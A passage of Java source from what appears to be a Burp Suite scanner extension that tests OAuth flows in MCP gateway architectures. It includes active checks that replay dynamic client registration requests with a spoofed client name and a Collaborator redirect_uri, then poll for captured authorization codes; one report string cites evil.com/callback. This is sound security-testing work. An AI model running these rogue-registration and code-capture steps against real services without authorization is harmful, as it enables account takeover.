    private static Set<String> printedTopology = java.util.concurrent.ConcurrentHashMap.newKeySet();
    private Set<String> reportedF2Hosts = java.util.concurrent.ConcurrentHashMap.newKeySet();
    private Set<String> reportedF2PendingValidationHosts = java.util.concurrent.ConcurrentHashMap.newKeySet();
    private Map<String, DcrValidationContext> dcrValidationContexts = new java.util.concurrent.ConcurrentHashMap<>();

    private class DcrValidationContext {
        public String hostKey;
        public IHttpService issueService;
        public URL issueUrl;
        public IHttpRequestResponse baseRequestResponse;
        public IHttpRequestResponse registrationResponse;
        public IBurpCollaboratorClientContext collaboratorContext;
        public String collabPayload;
        public String registeredClientName;
        public String registeredClientId;
        public String manualClientId;
        public String evilRedirectUri;
        public String manualAuthorizationUrl;
    }

    /**
     * 核心算法：基于发货与收货拓扑关系的层级推断
     * 返回值： "L1" (网关), "L2" (底层AS), "L3" (外部IdP), "UNKNOWN" (非OAuth)
     */
    private String identifyLayer(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        IParameter redirectUriParam = helpers.getRequestParameter(baseRequestResponse.getRequest(), "redirect_uri");
        IParameter stateParam = helpers.getRequestParameter(baseRequestResponse.getRequest(), "state");
        IParameter clientIdParam = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");

        // 如果连基本的 OAuth 特征都没有，直接返回 UNKNOWN
        if (clientIdParam == null && redirectUriParam == null) {
            return "UNKNOWN";
        }

        String reqHost = reqInfo.getUrl().getHost().toLowerCase();
        String layer = "UNKNOWN";

        if (redirectUriParam != null) {
            String decodedRedirectUri = helpers.urlDecode(redirectUriParam.getValue()).toLowerCase();

            // 1. 锚定 L1 (Anchor L1)：收货地址是本地或 MCP 客户端独有特征
            if (decodedRedirectUri.contains("127.0.0.1") ||
                    decodedRedirectUri.contains("localhost") ||
                    decodedRedirectUri.contains("vscode.dev") ||
                    decodedRedirectUri.startsWith("vscode://") ||
                    decodedRedirectUri.startsWith("cursor://")) {

                // 将当前请求的 Host 标记为 MCP 网关
                knownGateways.add(reqHost);
                layer = "L1";
            }
            // 2. 追踪 L2 (Trace L2)：收货地址指向了我们已知的 MCP 网关
            else {
                try {
                    java.net.URL redirUrl = new java.net.URL(decodedRedirectUri);
                    String redirHost = redirUrl.getHost().toLowerCase();
                    if (knownGateways.contains(redirHost)) {
                        layer = "L2";
                    }
                } catch (Exception e) {
                    // redirect_uri 解析失败则继续往下走
                }
            }
        }

        // 3.  L2 ：如果在上面没被识别出来，但发现 state 嵌套了双层上下文
        if ("UNKNOWN".equals(layer) && stateParam != null && extractStatePayload(stateParam.getValue(), helpers) != null) {
            layer = "L2";
        }

        // 4.  L3 (External IdP)：有 OAuth 特征，但既不回本地，也不回已知网关
        if ("UNKNOWN".equals(layer) && redirectUriParam != null && clientIdParam != null) {
            layer = "L3";
        }

        // ==========================================
        // 日志输出逻辑：确保每个 Host 对应的 Layer 只打印一次
        // ==========================================
        if (!"UNKNOWN".equals(layer)) {
            // 组合一个唯一键，例如 "mcp.notion.com::L1"
            String logKey = reqHost + "::" + layer;

            // Set.add() 方法如果发现集合中已经有这个元素，会返回 false。
            // 借此我们能完美实现“只在第一次发现时打印”的去重效果。
            if (printedTopology.add(logKey)) {
                stdout.println("[*] Topology Inferred -> [" + reqHost + "] is identified as [" + layer + "]");
            }
        }

        return layer;
    }

    // implementing IBurpExtender
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        // keep a reference to our callbacks object
        this.callbacks = callbacks;
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();
        BurpExtender.stdout = new PrintWriter(callbacks.getStdout(), true);
        BurpExtender.stderr = new PrintWriter(callbacks.getStderr(), true);

        // Set extension name
        callbacks.setExtensionName(PLUGIN_NAME);
        callbacks.registerScannerInsertionPointProvider(this);
        callbacks.registerScannerCheck(this);
        stdout.println("[+] MCPOAUTHScan v1.1 Plugin Loaded Successfully");
    }



    public static Map<String, String> getQueryMap(String query) {
        // Extract the params from URL query
        Map<String, String> qmap = new HashMap<String, String>();
        if (query == null) {
            return null;
        }
        String[] qparams = query.split("&");
        for (String qparam : qparams) {
            if (qparam.split("=").length > 1) {
                String name = qparam.split("=")[0];
                String value = qparam.split("=")[1];
                qmap.put(name, value);
            }
        }
        return qmap;
    }




    public String getHttpHeaderValueFromList(List<String> listOfHeaders, String headerName) {
        // Extract heder value if present in the specified list of strings
        if (listOfHeaders != null) {
            for(String item: listOfHeaders) {
                if (item.toLowerCase().contains(headerName.toLowerCase())) {
                    String[] headerItems = item.split(":", 2);
                    if (headerItems.length >= 1) {
                        return item.split(":", 2)[1];
                    }
                }
            }
        }
        return null;
    }



    public String getUrlOriginString(String urlstring) {
        // Retrieve origin value from url-string
        String origin = "";
        if (urlstring.contains("%")) {
            // If url is encoded then first decode it
            helpers.urlDecode(urlstring);
        }
        if (!urlstring.isEmpty() & urlstring!=null) {
            Pattern pattern = Pattern.compile("(https?://)([^:^/]*)(:\\d*)?(.*)?");
            Matcher matcher = pattern.matcher(urlstring);
            if (matcher.find()) {
                if (matcher.group(3)==null || matcher.group(3).isEmpty() || matcher.group(3).equals("80") || matcher.group(3).equals("443")) {
                    origin = matcher.group(1)+matcher.group(2);
                } else {
                    origin = matcher.group(1)+matcher.group(2)+matcher.group(3);
                }
            }
        }
        return origin;
    }

    private String getOriginPathKey(URL url) {
        if (url == null) {
            return "";
        }

        int port = url.getPort();
        if (port == -1) {
            port = url.getDefaultPort();
        }

        String path = url.getPath();
        if (path == null || path.isEmpty()) {
            path = "/";
        }

        return url.getProtocol().toLowerCase() + "://" +
                url.getHost().toLowerCase() + ":" +
                port +
                path.toLowerCase();
    }



    private String getCollaboratorIssueDetails(IBurpCollaboratorInteraction event, IBurpCollaboratorClientContext collaboratorContext) {
        // Method to generate the appropriate burp-collaborator issue detail for OAUTHv2/OpenID 'request_uri' SSRF issues
        String issueDetails = "";
        String localTimestamp = "";
        // Convert timestamp to local time
        String dateStr = event.getProperty("time_stamp");
        SimpleDateFormat sdf =  new SimpleDateFormat("yyyy-MMM-dd HH:mm:ss z");
        TimeZone tz = TimeZone.getDefault();
        sdf.setTimeZone(tz);
        try{
            Date date = sdf.parse(dateStr);
            localTimestamp = sdf.format(date);
        } catch(Exception e) {
            localTimestamp = dateStr;
        }
        // Set the issueDetails value based on IBurpCollaboratorInteraction types
        switch (event.getProperty("type")) {
            case "DNS":
                issueDetails = "the Collaborator server received a DNS lookup of type <b>" + event.getProperty("query_type") +
                        "</b> for the domain name <b>" + event.getProperty("interaction_id") + "." +
                        collaboratorContext.getCollaboratorServerLocation() + "</b><br>" +
                        "The lookup was received from IP address " + event.getProperty("client_ip") + " at " +
                        localTimestamp + " <br><br>" + "Received DNS query (encoded in Base64):<br><code>" +
                        event.getProperty("raw_query") + "</code>";
                break;

            case "HTTP":
                issueDetails = "the Collaborator server received an HTTP request for the domain name <b>" + event.getProperty("interaction_id") +
                        "." + collaboratorContext.getCollaboratorServerLocation() + " </b> from IP address " +
                        event.getProperty("client_ip") + " at " + localTimestamp + "<br><br>" +
                        "Request received by Collaborator (encoded in Base64):<br><code>" +  event.getProperty("request") + "</code><br><br>" +
                        "Response from Collaborator (encoded in Base64):<br><code>" +  event.getProperty("response") + "</code>";
                break;

            case "SMTP":
                String decodedConversation = new String(Base64.getDecoder().decode(event.getProperty("conversation")));
                Pattern patt = Pattern.compile(".*mail from:.*?<(.*?)>.*rcpt to:.*?<(.*?)>.*\\r\\n\\r\\n(.*?)\\r\\n\\.\\r\\n.*",Pattern.CASE_INSENSITIVE + Pattern.DOTALL);
                Matcher match = patt.matcher(decodedConversation);
                if(match.find()) {
                    String from = match.group(1);
                    String to = match.group(2);
                    String message = match.group(3);
                    issueDetails = "the Collaborator server received an SMTP connection from IP address " +
                            event.getProperty("client_ip") + " at " + localTimestamp + " <br><br>" +
                            "The email details were:<br><br>From:<br><b>" + from + "</b><br><br>To:<br><b>" + to +
                            "</b><br><br>Message:<br><code>" + message + "</code><br><br>" +
                            "SMTP Conversation:<br><br><code>" + decodedConversation.replace("\r\n", "<br>") + "</code>";
                } else {
                    issueDetails = "the Collaborator server received an SMTP connection from IP address " +
                            event.getProperty("client_ip") + " at " + localTimestamp + " <br><br>" +
                            "SMTP Conversation:<br><br><code>" + decodedConversation.replace("\r\n", "<br>") + "</code>";
                }
                break;

            default:
                issueDetails = "the Collaborator server received a " + event.getProperty("type") +  " interaction from IP address " +
                        event.getProperty("client_ip") + " at " + localTimestamp + " (domain name: <b>" +
                        event.getProperty("interaction_id") + "." + collaboratorContext.getCollaboratorServerLocation() + "</b>)";
                break;
        }
        return issueDetails;
    }

    private String extractJsonStringValue(String data, String keyName) {
        if (data == null || keyName == null) {
            return null;
        }
        Matcher matcher = Pattern.compile("(?i)\"" + Pattern.quote(keyName) + "\"\\s*:\\s*\"([^\"]+)\"").matcher(data);
        if (matcher.find()) {
            return matcher.group(1).replace("\\/", "/");
        }
        return null;
    }

    private String buildDcrAuthorizationUrl(String authorizationEndpoint, String clientId, String redirectUri) {
        if (authorizationEndpoint == null || authorizationEndpoint.isEmpty() || clientId == null || clientId.isEmpty()) {
            return null;
        }
        String separator = authorizationEndpoint.contains("?") ? "&" : "?";
        return authorizationEndpoint + separator +
                "response_type=code" +
                "&client_id=" + helpers.urlEncode(clientId) +
                "&redirect_uri=" + helpers.urlEncode(redirectUri) +
                "&scope=openid" +
                "&state=mcpoauthscan_dcr_" + System.currentTimeMillis();
    }

    private String inferAuthorizationEndpoint(URL contextUrl, String wellKnownBody) {
        String endpoint = extractJsonStringValue(wellKnownBody, "authorization_endpoint");
        if (endpoint != null) {
            return endpoint;
        }

        if (contextUrl == null) {
            return null;
        }
        String origin = contextUrl.getProtocol() + "://" + contextUrl.getHost();
        if (contextUrl.getPort() != -1 && contextUrl.getPort() != contextUrl.getDefaultPort()) {
            origin += ":" + contextUrl.getPort();
        }
        return origin + "/authorize";
    }

    private void startDcrCodeOastPolling(
            IHttpService issueService,
            URL issueUrl,
            IHttpRequestResponse baseRequestResponse,
            IHttpRequestResponse registrationResponse,
            IBurpCollaboratorClientContext collaboratorContext,
            String collabPayload,
            String registeredClientName,
            String manualClientId,
            String evilRedirectUri,
            String manualAuthorizationUrl) {

        new Thread(() -> {
            int pollingAttempts = 30;
            int sleepInterval = 10000;
            stdout.println("[*] F2 pending validation: " + collabPayload);

            for (int i = 0; i < pollingAttempts; i++) {
                try {
                    Thread.sleep(sleepInterval);
                } catch (InterruptedException e) {
                    break;
                }

                try {
                    List<IBurpCollaboratorInteraction> interactions = collaboratorContext.fetchAllCollaboratorInteractions();
                    if (interactions == null || interactions.isEmpty()) {
                        continue;
                    }

                    StringBuilder interactionDetails = new StringBuilder();
                    String stolenCode = null;

                    for (IBurpCollaboratorInteraction interaction : interactions) {
                        interactionDetails.append("<b>Type:</b> ").append(interaction.getProperty("type")).append("<br>");
                        interactionDetails.append("<b>Client IP:</b> ").append(interaction.getProperty("client_ip")).append("<br>");

                        if ("http".equalsIgnoreCase(interaction.getProperty("type"))) {
                            String reqBase64 = interaction.getProperty("request");
                            if (reqBase64 != null) {
                                byte[] reqBytes = helpers.base64Decode(reqBase64);
                                String reqString = helpers.bytesToString(reqBytes);
                                Matcher codeMatcher = Pattern.compile("(?i)(?:[?&]|\\b)(?:code|authCode)=([^&\\s]+)").matcher(reqString);
                                if (codeMatcher.find()) {
                                    stolenCode = helpers.urlDecode(codeMatcher.group(1));
                                }
                                interactionDetails.append("<pre>")
                                        .append(reqString.replace("<", "&lt;").replace(">", "&gt;"))
                                        .append("</pre><br><hr>");
                            }
                        }
                    }

                    if (stolenCode != null) {
                        callbacks.addScanIssue(new CustomScanIssue(
                                issueService,
                                issueUrl,
                                new IHttpRequestResponse[] {
                                        callbacks.applyMarkers(baseRequestResponse, null, null),
                                        callbacks.applyMarkers(registrationResponse, null, null)
                                },
                                "[Flaw 2] Client Identity Blind Trust (OAST Confirmed)",
                                "<b>Firm evidence for Client Identity Blind Trust.</b><br><br>" +
                                        "The scanner first confirmed F1 by registering a client with <code>client_name</code> set to <code>" + registeredClientName + "</code> and <code>redirect_uris</code> set to the Burp Collaborator callback <code>" + evilRedirectUri + "</code>.<br><br>" +
                                        "The manual authorization link then used the forged <code>client_id</code>: <code>" + manualClientId + "</code>.<br><br>" +
                                        "After the manual authorization link was visited, Burp Collaborator received an HTTP callback carrying an authorization code: <code>" + stolenCode + "</code>.<br><br>" +
                                        "<b>Manual authorization URL:</b><br><code style='word-break: break-all;'>" + manualAuthorizationUrl + "</code><br><br>" +
                                        "<b>Collaborator evidence:</b><br>" + interactionDetails,
                                "High",
                                "Firm"
                        ));
                        stdout.println("[!] F2 pending validation confirmed. Code captured for payload: " + collabPayload);
                        return;
                    }
                } catch (Exception e) {
                    stderr.println("[-] Error in F1 DCR OAST polling thread: " + e.toString());
                }
            }

            stdout.println("[-] F2 pending validation polling thread finished without code for payload: " + collabPayload);
        }).start();
    }

    private String getF2ValidationHostKey(IHttpRequestResponse message) {
        if (message == null || message.getHttpService() == null) {
            return null;
        }
        return message.getHttpService().getHost().toLowerCase();
    }

    private IScanIssue rememberDcrValidationContext(DcrValidationContext context) {
        if (context == null || context.hostKey == null || context.manualAuthorizationUrl == null) {
            return null;
        }
        dcrValidationContexts.put(context.hostKey, context);
        if (reportedF2Hosts.contains(context.hostKey)) {
            return emitF2PendingValidationIssue(context, false);
        }
        return null;
    }

    private IScanIssue rememberF2DetectedAndReportPendingIfReady(IHttpRequestResponse baseRequestResponse) {
        String hostKey = getF2ValidationHostKey(baseRequestResponse);
        if (hostKey == null) {
            return null;
        }
        reportedF2Hosts.add(hostKey);
        DcrValidationContext context = dcrValidationContexts.get(hostKey);
        if (context != null) {
            return emitF2PendingValidationIssue(context, false);
        }
        return null;
    }

    private IScanIssue emitF2PendingValidationIssue(DcrValidationContext context, boolean addViaCallback) {
        if (context == null || context.hostKey == null || !reportedF2PendingValidationHosts.add(context.hostKey)) {
            return null;
        }

        IScanIssue issue = new CustomScanIssue(
                context.issueService,
                context.issueUrl,
                new IHttpRequestResponse[] {
                        callbacks.applyMarkers(context.baseRequestResponse, null, null),
                        callbacks.applyMarkers(context.registrationResponse, null, null)
                },
                "[Flaw 2 validation] Pending User Action: Client Identity Blind Trust",
                "<b>Manual validation required.</b><br><br>" +
                        "Flaw 2 has already been detected, and Flaw 1 has provided a dynamically registered Collaborator redirect_uri that can be used for validation.<br><br>" +
                        "<b>Registered DCR client_id:</b> <code>" + context.registeredClientId + "</code><br>" +
                        "<b>Forged client_id used for Flaw 2 validation:</b> <code>" + context.manualClientId + "</code><br>" +
                        "<b>Collaborator redirect_uri:</b> <code>" + context.evilRedirectUri + "</code><br><br>" +
                        "<b>Manual authorization URL:</b><br><code style='word-break: break-all;'>" + context.manualAuthorizationUrl + "</code><br><br>" +
                        "Open the URL in an authenticated browser routed through Burp and complete the authorization flow. " +
                        "The scanner will poll Burp Collaborator for 5 minutes. If the callback contains <code>code</code> or <code>authCode</code>, a Firm Flaw 2 confirmation issue will be added automatically.",
                "Information",
                "Certain"
        );

        if (addViaCallback) {
            callbacks.addScanIssue(issue);
        }

        startDcrCodeOastPolling(
                context.issueService,
                context.issueUrl,
                context.baseRequestResponse,
                context.registrationResponse,
                context.collaboratorContext,
                context.collabPayload,
                context.registeredClientName,
                context.manualClientId,
                context.evilRedirectUri,
                context.manualAuthorizationUrl
        );

        return issue;
    }



    // Helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match) {
        List<int[]> matches = new ArrayList<int[]>();
        int start = 0;
        while (start < response.length)
        {
            start = helpers.indexOf(response, match, false, start, response.length);
            if (start == -1) break;
            matches.add(new int[] { start, start + match.length });
            start += match.length;
        }
        return matches;
    }


    // Helper method to check keys on JSON object
    public Boolean hasJSONKey(JSONObject jsonObj, String param) {
        if (jsonObj.has(param)) {
            return true;
        }
        return false;
    }




    // Method to search specified patterns on HTTP request and responses
    public List<String> getMatchingParams(String paramName, String toSearch, String data, String mimeType) {
        List<String> matches = new ArrayList<String>();
        Pattern pattern = null;
        String data_lower;
        int minLength = 4;
        if (data!=null) {
            // Case insensitive search
            paramName = paramName.toLowerCase();
            toSearch = toSearch.toLowerCase();
            data_lower = data.toLowerCase();
            if (data_lower.contains(toSearch)) {
                if (mimeType == null) {
                    // Parameter in response without a Content-Type
                    pattern = Pattern.compile("[&\\?]?" + paramName + "=([A-Za-z0-9\\-_\\.~\\+/]+)[&]?");
                } else if (mimeType.toLowerCase().contains("json")) {
                    // Parameter in Json body
                    pattern = Pattern.compile("['\"]{1}" + paramName + "['\"]{1}[\\s]*:[\\s]*['\"]?([A-Za-z0-9\\-_\\.~\\+/]+)['\"]?");
                } else if (mimeType.contains("xml") ) {
                    // Parameter in xml body
                    pattern = Pattern.compile("<" + paramName + ">[\\s\\n]<([A-Za-z0-9\\-_\\.~\\+/]+)>");
                } else if (mimeType == "header" || (data.contains("Location: ") & data.contains("302 Found"))) {
                    // Parmeter in Location header Url
                    pattern = Pattern.compile("[&\\?]?" + paramName + "=([A-Za-z0-9\\-_\\.~\\+/]+)[&]?");
                } else if (mimeType == "link") {
                    // Parameter in url of HTML link tag like "<a href=" or "<meta http-equiv=refresh content='3;url="
                    pattern = Pattern.compile("[&\\?]?" + paramName + "=([A-Za-z0-9\\-_\\.~\\+/]+)[&]?");
                    pattern = Pattern.compile("<[\\w]+ [&\\?]?" + paramName + "=([A-Za-z0-9\\-_\\.~\\+/]+)[&]?");

                } else {
                    // Parameter in text/html body
                    if (data.contains("location.href") || data.contains("location.replace") || data.contains("location.assign")) {
                        // If parameter is in javascript content
                        pattern = Pattern.compile("[&\\?]?" + paramName + "=([A-Za-z0-9\\-_\\.~\\+/]+)[&]?");
                    } else {
                        // If parameter is within an HTML page
                        pattern = Pattern.compile("['\"]{1}" + paramName + "['\"]{1}[\\s]*value=['\"]{1}([A-Za-z0-9\\-_\\.~\\+/]+)['\"]{1}");
                    }
                }
                if (pattern == null) {
                    return matches;
                }
                Matcher matcher = pattern.matcher(data_lower);
                // Get all matching strings in body
                while(matcher.find()) {
                    int start = matcher.start(1);
                    int end = matcher.end(1);
                    // Discard codes too short (probable false matching codes)
                    if (end-start >= minLength) {
                        matches.add(data.substring(start, end));
                    }
                }
            }
        }
        // Finally remove duplicate values
        matches = new ArrayList<>(new HashSet<>(matches));
        return matches;
    }






    // Passive Scan section ///////////////////////////////

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        long currentTimeStampMillis = Instant.now().toEpochMilli();
        List<IScanIssue> issues = new ArrayList<>();
        String respType = "";
        String redirUri = "";

        flowEngine.processPassiveTraffic(helpers, baseRequestResponse);

        // Getting request an response data
        byte[] rawRequest = baseRequestResponse.getRequest();
        byte[] rawResponse = baseRequestResponse.getResponse();
        String requestString = helpers.bytesToString(rawRequest);
        String responseString = helpers.bytesToString(rawResponse);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        IResponseInfo respInfo = helpers.analyzeResponse(rawResponse);
        String reqQueryString = reqInfo.getUrl().toString();

        // Getting the Request URL query parameters
        Map<String, String> reqQueryParam = new HashMap<String, String>();
        if (reqInfo.getUrl() != null) {
            if (reqInfo.getUrl().getQuery() != null) {
                reqQueryParam = getQueryMap(reqInfo.getUrl().getQuery());
            }
        }

        // Getting the Request Params and Headers
        List<IParameter> reqParam = reqInfo.getParameters();
        List<String> reqHeaders = reqInfo.getHeaders();
        //String reqBodyString = new String(Arrays.copyOfRange(rawRequest, reqInfo.getBodyOffset(), rawRequest.length));

        // Getting the Response Headers and Body
        List<String> respHeaders = respInfo.getHeaders();
        String respBody = "";
        String reqBody = "";


        // Check the presence of body in HTTP response based on RFC 7230 https://tools.ietf.org/html/rfc7230#section-3.3
        if ( (getHttpHeaderValueFromList(respHeaders, "Transfer-Encoding")!=null || getHttpHeaderValueFromList(respHeaders, "Content-Length")!=null) && (!reqInfo.getMethod().toLowerCase().contains("head")) ) {
            respBody = responseString.substring(respInfo.getBodyOffset()).trim();
        }

        // Check the presence of body in HTTP request based on RFC 7230 https://tools.ietf.org/html/rfc7230#section-3.3
        if ( (getHttpHeaderValueFromList(reqHeaders, "Transfer-Encoding")!=null || getHttpHeaderValueFromList(reqHeaders, "Content-Length")!=null) && (!reqInfo.getMethod().toLowerCase().contains("head")) ) {
            reqBody = requestString.substring(reqInfo.getBodyOffset()).trim();
        }


        // Retrieving some OAUTHv2/OpenID request parameters
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter redirParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "redirect_uri");
        IParameter clientidParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        IParameter stateParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "state");
        IParameter grantParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "grant_type");
        IParameter challengeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code_challenge");
        IParameter challengemethodParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code_challenge_method");
        IParameter requesturiParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "request_uri");
        IParameter nonceParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "nonce");
        IParameter respmodeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_mode");


        // 1. 获取当前请求的拓扑层级，并驱动状态机建树
        String layer = identifyLayer(baseRequestResponse);

        // 2. L3 外部 IdP 发现 (黑盒隔离)
        if ("L3".equals(layer)) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                    "[Structure] External OAuth Flow Detected (Layer 3)",
                    "<b>检测到外部 Identity Provider (IdP) 授权流。</b><br>此节点已被标记为 External，扫描器保留了此记录用于拓扑分析，但将对其跳过主动攻击。",
                    "Information", "Certain"
            ));
        }

        // 3. 【状态驱动】嵌套架构快照审计 (L1 vs L2)
        String anchor = flowEngine.extractStateAnchor(helpers, baseRequestResponse);
        OAuthFlowContext flow = anchor != null ? flowEngine.activeFlowsByState.get(anchor) : null;

        // 【修复 2A】：只有当真实的 L2 请求 (l2AuthReq) 到达后，才进行一致性校验！
        if (flow != null && !flow.isL1L2ConsistencyChecked && (flow.state == FlowState.L2_AUTH_REQUESTED || flow.l2State != null)) {
        //if (flow != null && flow.state == FlowState.L2_AUTH_REQUESTED && !flow.isL1L2ConsistencyChecked && flow.l2AuthReq != null) {

            // 3.1 报告发现嵌套架构 (同一条流只报一次)
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                    "[Structure] MCP Nested OAuth Architecture Detected",
                    "检测到后端驱动的嵌套授权架构。协议状态机已成功跟踪至第二层 (Layer 2)。",
                    "Information", "Certain"
            ));

            // 3.2 检查内层 PKCE 缺失 (Flaw 3)
            if (flow.l1PkceChallenge != null && flow.l2PkceChallenge == null) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                        new IHttpRequestResponse[] { callbacks.applyMarkers(flow.l1AuthReq, null, null) },
                        "[Flaw 3] Nested Policy Inconsistency (Missing Inner PKCE)",
                        "层级策略不一致：外层/网关使用了 PKCE，但网关生成的内层授权链接丢失了 PKCE 保护。",
                        "High", "Firm"
                ));
            }

            flow.isL1L2ConsistencyChecked = true;
        }

        // 4. MCP State 内部协议上下文打包检测 (使用你上面定义的 stateParameter)
        if (stateParameter != null) {
            String stateVal = stateParameter.getValue();
            if (!alreadyReportedStates.contains(stateVal)) {
                String[] extracted = extractStatePayload(stateVal, helpers);
                if (extracted != null) {
                    alreadyReportedStates.add(stateVal);
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                            "[Info] MCP State Parameter Packaged Context Detected",
                            "发现 state 参数打包了内部协议上下文！<br><b>解码内容:</b> <code>" + extracted[1] + "</code><br>这属于双层 OAuth 架构的典型特征，存在被主动篡改的风险。",
                            "Information", "Firm"
                    ));
                }
            }
        }

        //5. 恶意动态注册
        // ==============================================================================
        // Flaw 1: 动态客户端注册 (DCR) 滥用检测
        // ==============================================================================
        String reqPathRaw = reqInfo.getUrl().getPath();
        String lowerReqPath = reqPathRaw != null ? reqPathRaw.toLowerCase() : "";
        String passiveDcrKey = getOriginPathKey(reqInfo.getUrl());

        // 安全提取当前请求的 Body 字符串
        String currentReqBodyStr = null;
        int currentBodyOffset = reqInfo.getBodyOffset();
        if (rawRequest.length > currentBodyOffset) {
            currentReqBodyStr = helpers.bytesToString(rawRequest).substring(currentBodyOffset).trim();
        }

        // ------------------------------------------------------------------------------
        // 被动拦截真实注册请求
        // ------------------------------------------------------------------------------
        if (reqInfo.getMethod().equals("POST") && currentReqBodyStr != null && (lowerReqPath.contains("register") || lowerReqPath.contains("client"))
                && currentReqBodyStr.contains("\"redirect_uris\"") && currentReqBodyStr.contains("\"client_name\"")) {

            if (alreadyTestedPassiveDCR.add(passiveDcrKey)) {
                stdout.println("[+] MCP Passive Scan: Intercepted DCR request, Triggering Abuse test on " + reqPathRaw);

                try {
                    IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                    String collabPayload = collaboratorContext.generatePayload(true);
                    String evilRedirectUri = "https://" + collabPayload;
                    String registeredClientName = "Visual Studio Code";
                    String manualClientId = "fake_evil_mcp_client_" + System.currentTimeMillis();

                    // 精准篡改 client_name 和 redirect_uris
                    String tamperedBody = currentReqBodyStr.replaceAll("(?i)(\"client_name\"\\s*:\\s*\")[^\"]+(\")", "$1" + registeredClientName + "$2");
                    tamperedBody = tamperedBody.replaceAll("(?i)(\"redirect_uris\"\\s*:\\s*\\[)[^\\]]+(\\])", "$1\"" + evilRedirectUri + "\"$2");

                    byte[] newBodyBytes = helpers.stringToBytes(tamperedBody);

                    // 保留所有原始 HTTP 头
                    java.util.List<String> originalHeaders = reqInfo.getHeaders();
                    byte[] checkRequest = helpers.buildHttpMessage(originalHeaders, newBodyBytes);

                    IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);

                    if (checkResponse != null && checkResponse.getResponse() != null) {
                        IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResponse.getResponse());
                        String checkResponseStr = helpers.bytesToString(checkResponse.getResponse());

                        if (checkRespInfo.getStatusCode() >= 200 && checkRespInfo.getStatusCode() < 300
                                && checkResponseStr.contains("client_id") && checkResponseStr.contains(collabPayload)) {

                            String registeredClientId = extractJsonStringValue(checkResponseStr, "client_id");
                            String authorizationEndpoint = inferAuthorizationEndpoint(reqInfo.getUrl(), null);
                            String manualAuthorizationUrl = buildDcrAuthorizationUrl(authorizationEndpoint, manualClientId, evilRedirectUri);

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null), callbacks.applyMarkers(checkResponse, null, null) },
                                    "[Flaw 1] Malicious Dynamic Client Registration",
                                    "发现动态注册端点缺乏身份验证机制或域名校验！ <br><br>" +
                                            "扫描器拦截到了原始的客户端注册流量，并在<b>保留其所有必须参数和原始 HTTP 头的基础上</b>，将 <code>client_name</code> 篡改为恶意名称，将 <code>redirect_uris</code> 数组篡改为不受信任的回调地址 (https://evil.com/callback)。<br>" +
                                            "系统接受了该伪造请求并成功分配了全新的 <code>client_id</code>。<br><br>" +
                                            "<b>被攻击端点：</b> " + reqPathRaw + "<br><br>" +
                                            "<b>投递的无损篡改载荷：</b><br><code>" + tamperedBody + "</code>",
                                    "High", "Firm"
                            ));

                            if (manualAuthorizationUrl != null) {
                                DcrValidationContext validationContext = new DcrValidationContext();
                                validationContext.hostKey = getF2ValidationHostKey(baseRequestResponse);
                                validationContext.issueService = baseRequestResponse.getHttpService();
                                validationContext.issueUrl = reqInfo.getUrl();
                                validationContext.baseRequestResponse = baseRequestResponse;
                                validationContext.registrationResponse = checkResponse;
                                validationContext.collaboratorContext = collaboratorContext;
                                validationContext.collabPayload = collabPayload;
                                validationContext.registeredClientName = registeredClientName;
                                validationContext.registeredClientId = registeredClientId;
                                validationContext.manualClientId = manualClientId;
                                validationContext.evilRedirectUri = evilRedirectUri;
                                validationContext.manualAuthorizationUrl = manualAuthorizationUrl;
                                IScanIssue pendingIssue = rememberDcrValidationContext(validationContext);
                                if (pendingIssue != null) {
                                    issues.add(pendingIssue);
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    stderr.println("[!] Error testing intercepted registration endpoint: " + e.toString());
                }
            }
        }

        // ------------------------------------------------------------------------------
        // 基于 .well-known 的主动探测
        // ------------------------------------------------------------------------------
        if (lowerReqPath.contains("/.well-known/openid-configuration") || lowerReqPath.contains("/.well-known/oauth-authorization-server")) {

            if (respInfo != null && respInfo.getStatusCode() == 200) {
                String responseBodyStr = responseString.substring(respInfo.getBodyOffset());

                java.util.regex.Matcher m = java.util.regex.Pattern.compile("\"registration_endpoint\"\\s*:\\s*\"([^\"]+)\"").matcher(responseBodyStr);

                if (m.find()) {
                    String regEndpoint = m.group(1);
                    if (alreadyTestedActiveDCR.add(regEndpoint)) {
